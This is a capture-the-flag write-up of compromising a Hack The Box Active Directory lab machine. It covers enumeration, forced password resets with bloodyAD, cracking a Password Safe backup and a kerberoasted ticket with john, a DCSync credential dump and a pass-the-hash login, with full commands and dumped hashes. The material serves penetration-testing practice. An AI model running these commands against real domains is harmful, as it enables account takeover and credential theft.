1, Port scan
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-16 15:21:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-16T15:21:12
|_  start_date: N/A
|_clock-skew: -2h59m55s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

2, service enumerating
We have known the valid credit here 
`As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich`
Then let's check the SMB service firstly
```
smbmap -H 10.10.11.42 -u Olivia -p ichliebedich


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.42:445 Name: 10.10.11.42               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 

```

Let's use `crackmapexec` to leak something about this domain
```
crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute

SMB         administrator.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         administrator.htb 445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         administrator.htb 445    DC               [+] Brute forcing RIDs
SMB         administrator.htb 445    DC               498: ADMINISTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB         administrator.htb 445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)
SMB         administrator.htb 445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB         administrator.htb 445    DC               512: ADMINISTRATOR\Domain Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               513: ADMINISTRATOR\Domain Users (SidTypeGroup)
SMB         administrator.htb 445    DC               514: ADMINISTRATOR\Domain Guests (SidTypeGroup)
SMB         administrator.htb 445    DC               515: ADMINISTRATOR\Domain Computers (SidTypeGroup)
SMB         administrator.htb 445    DC               516: ADMINISTRATOR\Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               517: ADMINISTRATOR\Cert Publishers (SidTypeAlias)
SMB         administrator.htb 445    DC               518: ADMINISTRATOR\Schema Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               519: ADMINISTRATOR\Enterprise Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               520: ADMINISTRATOR\Group Policy Creator Owners (SidTypeGroup)
SMB         administrator.htb 445    DC               521: ADMINISTRATOR\Read-only Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               522: ADMINISTRATOR\Cloneable Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               525: ADMINISTRATOR\Protected Users (SidTypeGroup)
SMB         administrator.htb 445    DC               526: ADMINISTRATOR\Key Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               527: ADMINISTRATOR\Enterprise Key Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               553: ADMINISTRATOR\RAS and IAS Servers (SidTypeAlias)
SMB         administrator.htb 445    DC               571: ADMINISTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         administrator.htb 445    DC               572: ADMINISTRATOR\Denied RODC Password Replication Group (SidTypeAlias)
SMB         administrator.htb 445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB         administrator.htb 445    DC               1101: ADMINISTRATOR\DnsAdmins (SidTypeAlias)
SMB         administrator.htb 445    DC               1102: ADMINISTRATOR\DnsUpdateProxy (SidTypeGroup)
SMB         administrator.htb 445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB         administrator.htb 445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB         administrator.htb 445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB         administrator.htb 445    DC               1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
SMB         administrator.htb 445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB         administrator.htb 445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB         administrator.htb 445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB         administrator.htb 445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)

```

Let's use this credit to bloodhound and check where are we in this domain
```
bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42

```
![](images/Pasted%20image%2020250417045654.png)
We can found Olivia can control Michael, then let's start with Michael
![](images/Pasted%20image%2020250417045756.png)
Michael can change the password of Benjamin

So let's try to implement this part

3, exploit and implement
We can use bloody-AD  to exploit them.
Firstly, let's change the password of `Michael` to allow us to have the access to `Michael`
```
bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "12345678"
[+] Password changed successfully!

```
Then let's change the password of `Benjamin`
```
bloodyAD -u "Michael" -p "12345678" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
[+] Password changed successfully!
```

Now we have 3 valid credit
```
Olivia:ichliebedich
Michael:12345678
Benjamin:12345678
```

Let's come to our port scan, Besides the SMB service, we also have ftp service 
let's try to enumerate them
We can only get the access to ftp with user `Benjamin`
```
ftp administrator.htb
Connected to dc.administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:wither): Benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||61473|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||61476|)
125 Data connection already open; Transfer starting.
100% |*****************************************|   952        6.74 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (5.72 KiB/s)
```
There is a backup file `Backup.psafe3`
```
The .psafe3 file is the encrypted password database file used by the Password Safe password manager.

.psafe3 File Introduction
📦 Full Name: Password Safe Database File

🔒 Purpose: Save user encrypted account passwords, websites, notes and other sensitive information.

🔑 Encryption algorithm: Usually Twofish or more modern encryption algorithms (depending on the version)

🧠 Developed by: Password Safe was originally developed by the famous security expert Bruce Schneier.
```

I try to open this file `pwsafe Backup.psafe3`, but it seems like need a password here.
So I guess there would be `pwsafe2john` and `john` to help us get the cracked
```
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-04-17 05:14) 2.325g/s 14288p/s 14288c/s 14288C/s newzealand..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Here we go, we get the password `tekieromucho`
Then we can get the passwords 
```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Try to use these credits to login, only `emily` could be used by evil-winrm
`evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"`

3, shell as administrator
Let's continue to use `SharpHound` to collect the information and use `bloodhound` to check where are we in this domain
![](images/Pasted%20image%2020250417053119.png)
We found Emily control the Ethan totally
![](images/Pasted%20image%2020250417053451.png)
We can also found something interesting of Ethan's First Degree Object Control
This edge represents the combination of GetChanges and GetChangesAll. The combination of these two permissions grants the principal the ability to perform a DCSync attack.

This is used to obtain the Administrator password hash

Firstly, we can try to grab the password of Ethan
```
A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).

python3 targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

That means we need to synchronize time zone
ntpdate administrator.htb

python3 targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$690219b88c1d4f4238218db14cb0d7bd$56b96d61a1d861649b3f9141dcffb4f5a775a649261f3586b49c4b4f04255bed81f3582f95dcf944d463bcc9f952c91ea4e93be5ac7883a799d3402e550524a4a2ac61148002f35be25eb347eca06b453f6511decdf6bcbd348d1ec9094248c4bf983e8f37fe9ef08c5356dcc61f5fb9adfcaa82adc3c557483259afdf50013ecc887d4e9610cc627e48ad5f1e37b769a4a8c54b0efe166133bcebb214e549d1595cebca781b3c3dd2ed34566abeacf6452f76800a867792e1d2dfcc7364ea1cb19d6da4073450a654438d7dc072d078bb53429abe86d67717accaaae6423f3f417c3c8c571b4b4b33164ee3d569acf110c9cea73213f996732d87304cd702fb71d57cba85682daed56bd53f53b4eb0579db9f2b6421339679fe7e72fd6642e9adb10c6701a2e223b323287c38b37787b181a6680130ea6a2b85287b765db2ac5fb216bede0a17b79b8cfc97b4908e958d00de054ba5b9770c4b5de1aa2ee06139a39256f091a3e205ab9b6e4c5475294773f231944789dbd0ec201be81c4f95f0e3e1bc869c20aad035e2e9d3636bd5eb5a08eefeec6306bbf663f64044e0cbe7b1978b50f2ae2d9399fc620e29053cbac0a109fa01e4acffa4d2636924dc8c4d4242d6f0fed9fed4dff8a2fa8c68e7814398a79947b68bad20faa0da554d23111b0a5a3d17e0ccd575832de536d72d5fa8b64e0f1f23e1408e4711c0900a3c05c5e0e15b70ec74b52c60dea6cf81aa8c28f63b1fd52418d079fee38f7c9c502e74bfddbc481705bc62246c0fbf0b3005a1b9f14985b15ab295a9fd873140b6cc480de8ffddc1afeecfc0fe83924ed690f7e0468bbc9c6a989f5d36173ceec0c1e28335a4d461152ea3e138aca8601f0fef0b3f8f0e20f89fcced93db613b195e1d4329ae424dc03cc01da180d831886f0aad862118862367a9a8c787bc85cb92220e2b4633a1948ebe74af474a2684a57b05c8bf3f10f117abd51db76e77168a15865cd82e29ad607d4cdbb2b7149c5d5a292bea08d458265899f74204280ee8d737b8a296dad068722d35fc5c4fe9f3bfe7d6b9cec5f82eedbef2b90f33d2ee2245e7da55ffbea079ebec4e1057da84f0d353ff54228e7802f2f42f48a053771159e6a6e33206bfefaf8212b92f683c9e289b703be32e296fee9d09c6ebef0ea4acd4dac464a1ecc0357c659cb7ddf556b1e13b25cfcaf8cf3965e1aad1be2df510e810ada3bf6f9b3abf32280b5e362b9ca6b4c0a63a440cf090c7df69ae02e32026ecafdee8444f7d0586c835e0eca3e198cb8f50d75c247b1a2104d5a2c1595a56306a3c6e901cb8edbf530d92cf10d330ad0bdff22e8d112350da5407f50bdefe3d51a2414a8c65eca4707bce56a68340962afdfab829296e4594f57679ea7530e145b9cfb1d5d35a226d89daff207a362b3e848f30ba8405d74b742f6f1233ecc998c5dd5a54363a0b6b7c7bf724f2a479f1800b227935da50acc725d729bb1984e8fe02bb1fc1d8fa2090d4ead957d6aadb85ee78882a927041cb

Then we can use john to crack this hash
john ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2025-04-17 06:51) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Then we get `Ethan:limpbizkit`

Then let's continue
```
You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:

secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'

So our payload would be 
secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:519b4c84ffe7a54ef275463aaee05feff17f7ab0a3626777009ca9b071077f7b
administrator.htb\michael:aes128-cts-hmac-sha1-96:cf18258aebf243ab8eab4a6d6caec794
administrator.htb\michael:des-cbc-md5:194f1623cdf11957
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e110f75337181474608f51a5b22d8198d3fa56d68633b384b7136d4496c89337
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:aa2b24ac2fb879262faa4f6ca294f332
administrator.htb\benjamin:des-cbc-md5:1a4f0bce2343cebf
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 

```

Then we can get the result
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::`

Then let's try to get the shell with evil-winrm
```
evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
```

Finally we can get the administrator shell now.